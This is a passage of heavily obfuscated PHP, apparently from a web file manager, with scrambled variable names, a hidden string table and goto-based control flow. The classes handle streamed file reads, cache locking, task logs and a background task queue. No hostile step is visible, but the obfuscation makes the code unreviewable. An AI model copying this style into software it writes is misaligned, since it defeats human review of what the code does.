$ı€µÑ¸ =& $_SERVER[Ï×Œõ”û]; $èÑôÈ = $this->info($ÂîƒÎ¦é); if (!$èÑôÈ || !$èÑôÈ[$ı€µÑ¸[234]] && $èÑôÈ[$ı€µÑ¸[79]] > 1024 * 1024 * 10) { return !1; } if ($¯À©Û‡ === -1) { $¯À©Û‡ = $èÑôÈ[$ı€µÑ¸[79]]; } if ($¯À©Û‡ == 0) { return $ı€µÑ¸[12]; } $ÖÙ±Ÿ³° = array($ı€µÑ¸[1765] . $Óâ†ş†í . $ı€µÑ¸[896] . ($Óâ†ş†í + $¯À©Û‡ - 1)); $Û¾½¶ç¼ = url_request($ÂîƒÎ¦é, $ı€µÑ¸[1560], !1, $ÖÙ±Ÿ³°, !1, !1, 30); return $Û¾½¶ç¼[$ı€µÑ¸[1344]] ? $Û¾½¶ç¼[$ı€µÑ¸[1344]] : $ı€µÑ¸[12]; } public function download($¦¶Í²•Á, $¦åˆº¢ø) { Downloader::start($¦¶Í²•Á, $¦åˆº¢ø); return $¦åˆº¢ø; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($°Ôì•›, $Ğ×ŞËùÊ = '') { $this->info = $this->info($°Ôì•›); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ï×Œõ”û][87]]; $this->pathOpen = $°Ôì•›; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$°Ôì•›])) { self::$_chunkBuffer[$°Ôì•›] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¨±Ÿ²º±) { $”¿ŒåÙ­ = $this->fileSubstr($this->pose, $¨±Ÿ²º±); $this->pose += strlen($”¿ŒåÙ­); return $”¿ŒåÙ­; } public function stream_tell() { return $this->pose; } public function stream_seek($ë’§Ÿ¾, $¿ÑÙêÇ‘) { $‡¬áŠ¿ =& $_SERVER[Ï×Œõ”û]; if ($¿ÑÙêÇ‘ == SEEK_SET) { $this->pose = $ë’§Ÿ¾; } else { if ($¿ÑÙêÇ‘ == SEEK_CUR) { $this->pose += $ë’§Ÿ¾; } else { if ($¿ÑÙêÇ‘ == SEEK_END) { $this->pose = $this->info[$‡¬áŠ¿[79]] + intval($ë’§Ÿ¾); } } } if ($ë’§Ÿ¾ < 0) { $this->pose = $this->info[$‡¬áŠ¿[79]] + $ë’§Ÿ¾; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ï×Œõ”û][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($è™ªôÊû, $ˆÖ‘ÂĞ) { $ÊĞÒ«ò˜ =& $_SERVER[Ï×Œõ”û]; $³˜’›² = $this->info($è™ªôÊû); return array($ÊĞÒ«ò˜[1466] => 0, $ÊĞÒ«ò˜[1766] => 0, $ÊĞÒ«ò˜[16] => 32768 + 511, $ÊĞÒ«ò˜[1767] => 0, $ÊĞÒ«ò˜[1768] => 0, $ÊĞÒ«ò˜[1769] => 0, $ÊĞÒ«ò˜[1770] => 0, $ÊĞÒ«ò˜[79] => $³˜’›²[$ÊĞÒ«ò˜[79]], $ÊĞÒ«ò˜[1771] => $³˜’›²[$ÊĞÒ«ò˜[1616]], $ÊĞÒ«ò˜[1728] => $³˜’›²[$ÊĞÒ«ò˜[88]], $ÊĞÒ«ò˜[1727] => $³˜’›²[$ÊĞÒ«ò˜[233]], $ÊĞÒ«ò˜[1772] => 0, $ÊĞÒ«ò˜[1773] => 0); } static $fileInfo = array(); public function info($ıÓ€½µ×) { $ÂâŸ¡¾¦ = $_SERVER[Ï×Œõ”û][1774]; if (isset(self::$fileInfo[$ıÓ€½µ×])) { return self::$fileInfo[$ıÓ€½µ×]; } if (substr($ıÓ€½µ×, 0, strlen($ÂâŸ¡¾¦)) != $ÂâŸ¡¾¦) { return !1; } self::$fileInfo[$ıÓ€½µ×] = IO::info(substr($ıÓ€½µ×, strlen($ÂâŸ¡¾¦))); return self::$fileInfo[$ıÓ€½µ×]; } public static function read($ôİôï×, $œÜ³‚Üç, $ÌéÖÙõ¹) { if (!isset(self::$_fopenCache[$ôİôï×])) { $”®ø¨ = new StreamWrapperIO(); $”®ø¨->stream_open($ôİôï×); self::$_fopenCache[$ôİôï×] = $”®ø¨; } $”®ø¨ = self::$_fopenCache[$ôİôï×]; return $”®ø¨->fileSubstr($œÜ³‚Üç, $ÌéÖÙõ¹); } public static function _read($úÔÑÕØ´, $ÔÒŞ‘Æ¼, $÷öææ—‚) { $ˆÅŒÍò =& $_SERVER[Ï×Œõ”û]; $°‡çœñ‰ = fopen($úÔÑÕØ´, $ˆÅŒÍò[1620]); if (!$°‡çœñ‰) { return $ˆÅŒÍò[12]; } $¡ğôŠóõ = 8192; fseek($°‡çœñ‰, $ÔÒŞ‘Æ¼, SEEK_SET); $¼«éÒ¼ = $ˆÅŒÍò[12]; $¼äñÌäÉ = 0; while ($¼äñÌäÉ < $÷öææ—‚) { $äîŸ‚ = min($¡ğôŠóõ, $÷öææ—‚ - $¼äñÌäÉ); $¼«éÒ¼ .= fread($°‡çœñ‰, $äîŸ‚); $¼äñÌäÉ += $äîŸ‚; } fclose($°‡çœñ‰); return $¼«éÒ¼; } public function fileSubstr($£¤¼è˜, $ŸÎ’„ª) { $ËÈíÌºá =& $_SERVER[Ï×Œõ”û]; $†Ô¤¿œš = $this->info[$ËÈíÌºá[79]]; $âŞŞë‹› = $£¤¼è˜; $àâ±Å‰¸ = $ŸÎ’„ª; if ($£¤¼è˜ < 0) { $£¤¼è˜ = $†Ô¤¿œš + $£¤¼è˜; } if ($ŸÎ’„ª === !1) { $ŸÎ’„ª = $†Ô¤¿œš - $£¤¼è˜; } if ($£¤¼è˜ + $ŸÎ’„ª > $†Ô¤¿œš) { $ŸÎ’„ª = $†Ô¤¿œš - $£¤¼è˜; } if ($ŸÎ’„ª <= 0) { return $ËÈíÌºá[12]; } if ($£¤¼è˜ < 0 || $£¤¼è˜ >= $†Ô¤¿œš || $ŸÎ’„ª <= 0 || $ŸÎ’„ª > 1024 * 1024 * 10) { throw new Exception("\151\157\106\x69\x6c\x65\x52\145\141\144\40\145\x72\x72\157\162\x21\40\163\164\141\162\164\75{$£¤¼è˜}\73\154\x65\x6e\147\x74\150\x3d{$ŸÎ’„ª}\73\x20\x73\x69\172\145\x3d{$†Ô¤¿œš}\73"); } $ğ ÑÏøï = 64 * 1024; $ÓâşÖ÷Ô =& self::$_chunkBuffer[$this->path]; if (!$ÓâşÖ÷Ô) { $ÓâşÖ÷Ô = array(); } $¿¦ë˜×« = 0; $šœ°¡¬¹ = 0; $«åÈñï = $ËÈíÌºá[12]; foreach ($ÓâşÖ÷Ô as $¿¦ë˜×« => $«åÈñï) { $¿¦ë˜×« = intval($¿¦ë˜×«); $šœ°¡¬¹ = $¿¦ë˜×« + strlen($«åÈñï); if ($£¤¼è˜ >= $šœ°¡¬¹) { continue; } if ($£¤¼è˜ >= $¿¦ë˜×« && $£¤¼è˜ + $ŸÎ’„ª <= $šœ°¡¬¹) { return substr($«åÈñï, $£¤¼è˜ - $¿¦ë˜×«, $ŸÎ’„ª); } break; } if (count($ÓâşÖ÷Ô) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ËÈíÌºá[1775], $ËÈíÌºá[1776] . count($ÓâşÖ÷Ô) . "\73\x73\x74\141\162\164\x3d{$£¤¼è˜}\54\154\x65\x6e\147\x74\150\x3d{$ŸÎ’„ª}\73\x70\x6f\x73\x65\x3a{$¿¦ë˜×«}\176{$šœ°¡¬¹}"); throw new Exception($ËÈíÌºá[1777]); } $×éâ¨ºç = intval($£¤¼è˜ / $ğ ÑÏøï) * $ğ ÑÏøï; $™’Ïñã¤ = ceil(($£¤¼è˜ + $ŸÎ’„ª) / $ğ ÑÏøï) * $ğ ÑÏøï - $×éâ¨ºç; $îıÁËı› = IO::fileSubstr($this->path, $×éâ¨ºç, $™’Ïñã¤); $ÓâşÖ÷Ô[$×éâ¨ºç . $ËÈíÌºá[12]] = $îıÁËı›; ksort($ÓâşÖ÷Ô); $µ¼õÕ©„ = substr($îıÁËı›, $£¤¼è˜ - $×éâ¨ºç, $ŸÎ’„ª); return $µ¼õÕ©„; } private function log($Şæ³úó, $£¬§¡±Ù) { $ß‚÷ÛëÖ =& $_SERVER[Ï×Œõ”û]; $¶ì‰ğš¿ = timeFloat() - $this->timeStart; write_log(sprintf($ß‚÷ÛëÖ[1778], $Şæ³úó, $this->info[$ß‚÷ÛëÖ[32]], $¶ì‰ğš¿, $£¬§¡±Ù), $ß‚÷ÛëÖ[1322]); } } goto FÔ›¿¦¼“·; E›¡Äİ¡Ó±: class CacheLockRedis { public function lock($·ã‚â²†, $‚‚·’Õ† = 10) { $ÀÈº½ò“ = Cache::init(); $‰Ë×ô¡› = microtime(!0) + $‚‚·’Õ†; while (microtime(!0) < $‰Ë×ô¡›) { $×«™¯÷ = $ÀÈº½ò“->get($·ã‚â²†); if (!$×«™¯÷) { $ş±‹Ê•’ = $ÀÈº½ò“->setLock($·ã‚â²†, $‰Ë×ô¡›, $‚‚·’Õ†); if ($ş±‹Ê•’) { return !0; } } else { if ($×«™¯÷ < microtime(!0)) { $ÀÈº½ò“->set($·ã‚â²†, $‰Ë×ô¡›, $‚‚·’Õ† * 2); if ($ÀÈº½ò“->get($·ã‚â²†) === $×«™¯÷) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ÿß»Àîü) { return Cache::init()->get($Ÿß»Àîü); } public function unlock($¤ÖççÂÜ) { return Cache::init()->remove($¤ÖççÂÜ); } } class CacheLockMemcached { public function lock($Ç„ô­İû, $×Œş«ò = 0) { $õä¤Ï«¾ = Cache::init(); $Šˆ•ê·§ = microtime(!0) + $×Œş«ò; while (microtime(!0) < $Šˆ•ê·§) { $Ë‹÷Àí– = $õä¤Ï«¾->get($Ç„ô­İû); if (!$Ë‹÷Àí– || $Ë‹÷Àí– < microtime(!0)) { $ÅÒœ˜Èå = $õä¤Ï«¾->handle->add($Ç„ô­İû, $Šˆ•ê·§, $×Œş«ò); if ($ÅÒœ˜Èå) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($·´èŸèô) { return Cache::init()->get($·´èŸèô); } public function unlock($‰€¨ªË¾) { return Cache::init()->remove($‰€¨ªË¾); } } class CacheLockDatabase { public function lock($æ±×¬¡, $ã°Öˆóˆ = 0) { $””ºÇ™¹ = Model($_SERVER[Ï×Œõ”û][943]); $À¹ì Ëà = microtime(!0) + $ã°Öˆóˆ; while (microtime(!0) < $À¹ì Ëà) { $èœú³Ÿ = $””ºÇ™¹->get($æ±×¬¡); if (!$èœú³Ÿ || $èœú³Ÿ < microtime(!0)) { $ÕÉû§Ù‚ = $””ºÇ™¹->set($æ±×¬¡, $À¹ì Ëà); if ($ÕÉû§Ù‚) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($§ «­¥ó) { return Model($_SERVER[Ï×Œõ”û][943])->get($§ «­¥ó); } public function unlock($¡©Úşµ¯) { Model($_SERVER[Ï×Œõ”û][943])->remove($¡©Úşµ¯); } } goto A¶‰õ×ªåó; F²×‰šÍÑ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ºèĞ¸Ñ—, $‹°É¥ÒÂ = '', $Ûø²¢¼Á = 0, $íÓôÎ’Ñ = '') { $Ñ¼¡íâá =& $_SERVER[Ï×Œõ”û]; $íÓôÎ’Ñ = $íÓôÎ’Ñ ? $íÓôÎ’Ñ : ($‹°É¥ÒÂ ? $‹°É¥ÒÂ : $ºèĞ¸Ñ—); $³µ£Ú² = new Task($ºèĞ¸Ñ—, $‹°É¥ÒÂ, $Ûø²¢¼Á, $íÓôÎ’Ñ); $GLOBALS[$Ñ¼¡íâá[2023] . $ºèĞ¸Ñ—] = new TaskLog($Ñ¼¡íâá[1914], $³µ£Ú², $íÓôÎ’Ñ); return $³µ£Ú²; } public function __construct($¦ØÑÂó· = '', $”¶³„ ¤ = '', $©—ú’Î™ = '') { $–îÎÈ«ò =& $_SERVER[Ï×Œõ”û]; if (!$¦ØÑÂó·) { $¦ØÑÂó· = $–îÎÈ«ò[1914]; } $ú”¯€°„ = $¦ØÑÂó· . $–îÎÈ«ò[474] . rand_string(10); if (!$©—ú’Î™) { $©—ú’Î™ = $¦ØÑÂó· . $–îÎÈ«ò[53] . $©—ú’Î™; } switch ($¦ØÑÂó·) { case $–îÎÈ«ò[1914]: if (!$”¶³„ ¤ || !$”¶³„ ¤->task) { return echoLog($¦ØÑÂó· . $–îÎÈ«ò[2024]); } $’Ï¶ÒºÇ = $”¶³„ ¤; $ú”¯€°„ = $’Ï¶ÒºÇ->task[$–îÎÈ«ò[484]]; $¦ØÑÂó· = $’Ï¶ÒºÇ->task[$–îÎÈ«ò[484]]; if (!$’Ï¶ÒºÇ->task[$–îÎÈ«ò[1818]]) { $’Ï¶ÒºÇ->task[$–îÎÈ«ò[1818]] = $©—ú’Î™ ? $©—ú’Î™ : $¦ØÑÂó·; } break; case $–îÎÈ«ò[2025]: if (!$”¶³„ ¤) { return echoLog($¦ØÑÂó· . $–îÎÈ«ò[2026]); } $éÚ®Ö¾ = is_string($”¶³„ ¤) ? array($”¶³„ ¤) : $”¶³„ ¤; $’Ï¶ÒºÇ = new TaskFileTransfer($ú”¯€°„, $¦ØÑÂó·, 0, $©—ú’Î™ ? $©—ú’Î™ : $éÚ®Ö¾[0]); foreach ($éÚ®Ö¾ as $§ôâÜ½¾) { $’Ï¶ÒºÇ->addPath($§ôâÜ½¾); } break; case $–îÎÈ«ò[390]: if (!$”¶³„ ¤) { return echoLog($¦ØÑÂó· . $–îÎÈ«ò[2026]); } $éÚ®Ö¾ = is_string($”¶³„ ¤) ? array($”¶³„ ¤) : $”¶³„ ¤; $’Ï¶ÒºÇ = new TaskZip($ú”¯€°„, $¦ØÑÂó·, 0, $©—ú’Î™ ? $©—ú’Î™ : $éÚ®Ö¾[0]); foreach ($éÚ®Ö¾ as $§ôâÜ½¾) { $’Ï¶ÒºÇ->addPath($§ôâÜ½¾); } break; case $–îÎÈ«ò[1356]: if (!$”¶³„ ¤) { return echoLog($¦ØÑÂó· . $–îÎÈ«ò[2026]); } $’Ï¶ÒºÇ = new TaskUnZip($ú”¯€°„, $¦ØÑÂó·, 0, $©—ú’Î™ ? $©—ú’Î™ : $”¶³„ ¤); if ($”¶³„ ¤) { $’Ï¶ÒºÇ->addFile($”¶³„ ¤); } break; case $–îÎÈ«ò[151]: $’Ï¶ÒºÇ = new TaskHttp($ú”¯€°„, $¦ØÑÂó·); break; default: return; break; } $this->task = $’Ï¶ÒºÇ; $this->taskID = $ú”¯€°„; Hook::bind($–îÎÈ«ò[1950], array($this, $–îÎÈ«ò[2027])); Hook::bind($–îÎÈ«ò[1952], array($this, $–îÎÈ«ò[2028])); Hook::bind($–îÎÈ«ò[1946], array($this, $–îÎÈ«ò[2029])); echoLog($–îÎÈ«ò[2030] . $’Ï¶ÒºÇ->task[$–îÎÈ«ò[1818]]); } public function __destruct() { $this->end(); } public function end($¡ŸèßòÑ = '') { $Ë±‚½„ó =& $_SERVER[Ï×Œõ”û]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¡ŸèßòÑ); $this->task = !1; $this->taskID = !1; Hook::unbind($Ë±‚½„ó[1950], array($this, $Ë±‚½„ó[2027])); Hook::unbind($Ë±‚½„ó[1952], array($this, $Ë±‚½„ó[2028])); Hook::unbind($Ë±‚½„ó[1946], array($this, $Ë±‚½„ó[2029])); } public function taskUpdate($˜„õúûÍ) { $üŞí›ÁĞ =& $_SERVER[Ï×Œõ”û]; if (!$˜„õúûÍ || $this->taskID != $˜„õúûÍ[$üŞí›ÁĞ[484]]) { return; } $‰æ“½ŸÖ = 20; $Ëìû¬ºª = intval($˜„õúûÍ[$üŞí›ÁĞ[1931]] * $‰æ“½ŸÖ); $ìÖ„ôİ = $üŞí›ÁĞ[175] . str_repeat($üŞí›ÁĞ[465], $Ëìû¬ºª) . $üŞí›ÁĞ[1135] . str_repeat($üŞí›ÁĞ[53], $‰æ“½ŸÖ - $Ëìû¬ºª) . $üŞí›ÁĞ[177]; $³¶›­ï = $ìÖ„ôİ . sprintf($üŞí›ÁĞ[2031], $˜„õúûÍ[$üŞí›ÁĞ[1931]] * 100) . $üŞí›ÁĞ[2032]; $˜Ã¿ºÑ = $³¶›­ï . $˜„õúûÍ[$üŞí›ÁĞ[1930]] . $üŞí›ÁĞ[8] . $˜„õúûÍ[$üŞí›ÁĞ[1183]] . LNG($üŞí›ÁĞ[2033]); $ ¡×¢®Ò = $üŞí›ÁĞ[12]; if ($˜„õúûÍ[$üŞí›ÁĞ[2017]]) { $˜Ã¿ºÑ = $³¶›­ï . size_format($˜„õúûÍ[$üŞí›ÁĞ[1930]]) . $üŞí›ÁĞ[8] . size_format($˜„õúûÍ[$üŞí›ÁĞ[1183]]); $ ¡×¢®Ò = size_format($˜„õúûÍ[$üŞí›ÁĞ[1932]]) . $üŞí›ÁĞ[2034]; } if ($˜„õúûÍ[$üŞí›ÁĞ[1185]]) { $˜„õúûÍ[$üŞí›ÁĞ[1981]] = $˜„õúûÍ[$üŞí›ÁĞ[1185]] . $üŞí›ÁĞ[53] . $˜„õúûÍ[$üŞí›ÁĞ[1981]]; } if ($˜„õúûÍ[$üŞí›ÁĞ[1981]]) { $œ¸’ªüá = $üŞí›ÁĞ[12]; if ($˜„õúûÍ[$üŞí›ÁĞ[1983]]) { $œ¸’ªüá = $üŞí›ÁĞ[50] . size_format($˜„õúûÍ[$üŞí›ÁĞ[1984]]) . $üŞí›ÁĞ[8] . size_format($˜„õúûÍ[$üŞí›ÁĞ[1983]]); } $ ¡×¢®Ò .= $˜„õúûÍ[$üŞí›ÁĞ[1981]] . $œ¸’ªüá; } if ($˜„õúûÍ[$üŞí›ÁĞ[870]] && !$˜„õúûÍ[$üŞí›ÁĞ[1983]]) { $ ¡×¢®Ò .= $üŞí›ÁĞ[53] . size_format($˜„õúûÍ[$üŞí›ÁĞ[1988]]) . $üŞí›ÁĞ[8] . size_format($˜„õúûÍ[$üŞí›ÁĞ[870]]); } echoLog($˜Ã¿ºÑ . $üŞí›ÁĞ[53] . $ ¡×¢®Ò, !0); } public function taskEnd($¤Öãí‚§) { $Ü–êˆ =& $_SERVER[Ï×Œõ”û]; if (!$¤Öãí‚§ || $this->taskID != $¤Öãí‚§[$Ü–êˆ[484]]) { return; } $±¶—›¥ = $¤Öãí‚§ ? LNG($Ü–êˆ[2035]) . $Ü–êˆ[4] . $¤Öãí‚§[$Ü–êˆ[1930]] . $Ü–êˆ[8] . $¤Öãí‚§[$Ü–êˆ[1183]] . LNG($Ü–êˆ[2033]) . $Ü–êˆ[74] : $Ü–êˆ[12]; echoLog($Ü–êˆ[2036] . $¤Öãí‚§[$Ü–êˆ[1818]] . ($¤Öãí‚§[$Ü–êˆ[545]] ? $Ü–êˆ[74] . $¤Öãí‚§[$Ü–êˆ[545]] : $Ü–êˆ[12]) . $Ü–êˆ[74] . $±¶—›¥ . $Ü–êˆ[2037] . sprintf($Ü–êˆ[969], timeFloat() - $¤Öãí‚§[$Ü–êˆ[1933]]) . $Ü–êˆ[1945]); $this->end(); } public function taskKill($°ìœÀˆî) { $Ÿûñƒä =& $_SERVER[Ï×Œõ”û]; if (!$°ìœÀˆî || $this->taskID != $°ìœÀˆî[$Ÿûñƒä[484]]) { return; } echoLog($Ÿûñƒä[2038] . $°ìœÀˆî[$Ÿûñƒä[1818]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\165\x65\x75\145\114\x65\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\165\145\x75\145\x44\141\x74\x61"; const QUEUE_TIME = "\164\141\163\153\121\x75\x65\165\x65\114\x61\163\x74\x52\165\156"; const QUEUE_THREAD = "\x74\141\x73\x6b\121\x75\145\x75\x65\124\x68\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($şÃ¶£†å, $øÜµ± = array(), $³™ßİæĞ = '', $âÕÈÖ¯² = '') { $Ø·«‰­É =& $_SERVER[Ï×Œõ”û]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($âÕÈÖ¯² && array_find_by_field(self::$listData, $Ø·«‰­É[95], $âÕÈÖ¯²)) { return !0; } if ($âÕÈÖ¯² && array_find_by_field(self::$listDataAdd, $Ø·«‰­É[95], $âÕÈÖ¯²)) { return !0; } self::$listDataAdd[] = array($Ø·«‰­É[344] => $şÃ¶£†å, $Ø·«‰­É[2039] => $øÜµ±, $Ø·«‰­É[545] => $³™ßİæĞ, $Ø·«‰­É[95] => $âÕÈÖ¯²); return !0; } public static function addSubmit() { $–à¬Éä© =& $_SERVER[Ï×Œõ”û]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($–à¬Éä©[2040] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $–à¬Éä©[12], $–à¬Éä©[545])), $–à¬Éä©[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ğ¼èı ß, $Ÿ£šÄ©Ï = array(), $Àƒ‰¥Æ = '', $ˆ™¡ÜÈ‡ = '') { $òçŒ„ş =& $_SERVER[Ï×Œõ”û]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ã¢ô‚§Š = self::getAll(); if ($ˆ™¡ÜÈ‡ && array_find_by_field($ã¢ô‚§Š, $òçŒ„ş[95], $ˆ™¡ÜÈ‡)) { return !0; } $ã¢ô‚§Š[] = array($òçŒ„ş[344] => $Ğ¼èı ß, $òçŒ„ş[2039] => $Ÿ£šÄ©Ï, $òçŒ„ş[545] => $Àƒ‰¥Æ, $òçŒ„ş[95] => $ˆ™¡ÜÈ‡); self::setAll($ã¢ô‚§Š); write_log($òçŒ„ş[2040] . $Àƒ‰¥Æ, $òçŒ„ş[197]); return !0; } public static function run() { $ à”µƒ =& $_SERVER[Ï×Œõ”û]; $ø³Ïíß© = self::getAll(); $¥×–Ò²„ = array_shift($ø³Ïíß©); if (!$¥×–Ò²„) { return !1; } self::setAll($ø³Ïíß©); $²ñ‘Ş£Œ = timeFloat(); $¿‚“ÂÎÆ = $ à”µƒ[12]; try { $¿‚“ÂÎÆ = Hook::apply($¥×–Ò²„[$ à”µƒ[344]], $¥×–Ò²„[$ à”µƒ[2039]]); } catch (Exception $Îúî®¾¨) { write_log($Îúî®¾¨, $ à”µƒ[1322]); } $‘¡í‘®ı = number_format(timeFloat() - $²ñ‘Ş£Œ, 3) . $ à”µƒ[1945]; if ($¿‚“ÂÎÆ && is_string($¿‚“ÂÎÆ)) { $‘¡í‘®ı = $‘¡í‘®ı . $ à”µƒ[2041] . $¿‚“ÂÎÆ; } write_log($ à”µƒ[2042] . $¥×–Ò²„[$ à”µƒ[545]] . $ à”µƒ[2043] . $‘¡í‘®ı, $ à”µƒ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ ı«Ô¬ =& $_SERVER[Ï×Œõ”û]; $š •ö¦­ = self::threadCount() + 1; if ($š •ö¦­ > 3 || !self::count()) { return; } write_log($ ı«Ô¬[2044] . $š •ö¦­, $ ı«Ô¬[197]); Cache::set(self::QUEUE_THREAD, $š •ö¦­, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ ı«Ô¬[2045], $ ı«Ô¬[197]); } public static function getKey($½Ã÷Ÿ¡İ, $‰åüÒà½ = "\x69\156\164") { $£¿¿Ó¹² =& $_SERVER[Ï×Œõ”û]; Cache::removeMemory($½Ã÷Ÿ¡İ); $èÉÊ®ò = Cache::get($½Ã÷Ÿ¡İ); if ($‰åüÒà½ == $£¿¿Ó¹²[366]) { return $èÉÊ®ò ? intval($èÉÊ®ò) : 0; } if ($‰åüÒà½ == $£¿¿Ó¹²[2046]) { return is_array($èÉÊ®ò) ? $èÉÊ®ò : array(); } return $èÉÊ®ò; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Ï×Œõ”û][2046]); } public static function setAll($ò‰ÆãŞ) { $Ñ¿Ô‡çà = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ò‰ÆãŞ), $Ñ¿Ô‡çà); Cache::set(self::QUEUE_DATA, $ò‰ÆãŞ, $Ñ¿Ô‡çà); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($µğ™­ŠÖ, $£÷›®åó = 5.0) { if (!$µğ™­ŠÖ) { return; } $ŒÅ³ò— = Cache::get($µğ™­ŠÖ); if (!$ŒÅ³ò— || timeFloat() - floatVal($ŒÅ³ò—) >= $£÷›®åó) { Cache::set($µğ™­ŠÖ, timeFloat(), $£÷›®åó * 10); return !0; } return !1; } public static function timeLimitCall($÷‰‚™‘æ, $¨ÍÒÖü, $´¡Ü‰×Ï, $Ü¢ûˆÙ¦ = 5.0) { $áé³¬æ´ =& $_SERVER[Ï×Œõ”û]; if (!$÷‰‚™‘æ || !$¨ÍÒÖü) { return; } self::$asyncAdd = !0; $¡ÅĞ¦—  = $áé³¬æ´[2047]; $¸…ÌÊŸ¹ = Cache::get($¡ÅĞ¦— , !0); $Ù„ßÄºÙ = array($áé³¬æ´[2048] => timeFloat(), $áé³¬æ´[2049] => timeFloat(), $áé³¬æ´[344] => $¨ÍÒÖü, $áé³¬æ´[2039] => $´¡Ü‰×Ï, $áé³¬æ´[2050] => $Ü¢ûˆÙ¦); if (is_array($¸…ÌÊŸ¹[$÷‰‚™‘æ])) { if (timeFloat() - $¸…ÌÊŸ¹[$÷‰‚™‘æ][$áé³¬æ´[2048]] <= $Ù„ßÄºÙ[$áé³¬æ´[2050]] * 0.5) { return; } $Ù„ßÄºÙ[$áé³¬æ´[2049]] = $¸…ÌÊŸ¹[$÷‰‚™‘æ][$áé³¬æ´[2049]]; } $¸…ÌÊŸ¹[$÷‰‚™‘æ] = $Ù„ßÄºÙ; Cache::set($¡ÅĞ¦— , $¸…ÌÊŸ¹, 60); Cache::removeMemory($¡ÅĞ¦— ); write_log($áé³¬æ´[2051] . $÷‰‚™‘æ . $áé³¬æ´[74] . $¨ÍÒÖü . $áé³¬æ´[2052] . ACTION, $áé³¬æ´[197]); } public static function timeLimitCallLoop() { $„§ƒ”Ò =& $_SERVER[Ï×Œõ”û]; $‰Øï‹ÑÏ = array($„§ƒ”Ò[2053]); $ äó¹Œ² = in_array(strtolower(ACTION), $‰Øï‹ÑÏ); if (!$ äó¹Œ² && !self::$asyncAdd) { return; } $ä½–ÅÔ = $„§ƒ”Ò[2047]; $™»©Øã¸ = Cache::get($ä½–ÅÔ, !0); if (!$™»©Øã¸ || count($™»©Øã¸) <= 0) { return; } $©âˆšŸÂ = timeFloat(); $ÉâÁâÍì = array(); $³ì¦îÂˆ = array(); foreach ($™»©Øã¸ as $¶ùéÎ„ => $í¨á¯•) { if ($©âˆšŸÂ - $í¨á¯•[$„§ƒ”Ò[2049]] > $í¨á¯•[$„§ƒ”Ò[2050]]) { $³ì¦îÂˆ[$¶ùéÎ„] = $í¨á¯•; continue; } $ÉâÁâÍì[$¶ùéÎ„] = $í¨á¯•; } if (count($³ì¦îÂˆ) == 0) { return; } if (count($ÉâÁâÍì) == 0) { Cache::remove($ä½–ÅÔ); } else { Cache::set($ä½–ÅÔ, $ÉâÁâÍì, 60); } Cache::removeMemory($ä½–ÅÔ); self::runArr($³ì¦îÂˆ); } public static function finished($ñüŒ«è, $²…¡æšÁ) { $úÓİîÉ‚ =& $_SERVER[Ï×Œõ”û]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($úÓİîÉ‚[344] => $ñüŒ«è, $úÓİîÉ‚[2039] => $²…¡æšÁ); } private static function runArr($°¿µœ€ï) { $Ë”³öÜ =& $_SERVER[Ï×Œõ”û]; if (!$°¿µœ€ï) { return; } foreach ($°¿µœ€ï as $†ûØô‚Æ => $Ç˜­ãÖî) { try { Hook::apply($Ç˜­ãÖî[$Ë”³öÜ[344]], $Ç˜­ãÖî[$Ë”³öÜ[2039]]); write_log($Ë”³öÜ[2054] . $†ûØô‚Æ . $Ë”³öÜ[74] . $Ç˜­ãÖî[$Ë”³öÜ[344]] . $Ë”³öÜ[2052] . ACTION, $Ë”³öÜ[197]); } catch (Exception $æº›‡‰”) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto A×é‰ÀÁÛ; bˆŒÇÒ¯ÜÎ: class TaskFileTransfer extends Task { protected function startAfter() { $ˆ¿àÉÁÂ =& $_SERVER[Ï×Œõ”û]; $Ùô•Òı© =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ˆ¿àÉÁÂ[1960], array($this, $ˆ¿àÉÁÂ[1961])); Hook::bind($ˆ¿àÉÁÂ[1365], array($this, $ˆ¿àÉÁÂ[1962])); Hook::bind($ˆ¿àÉÁÂ[1963], array($this, 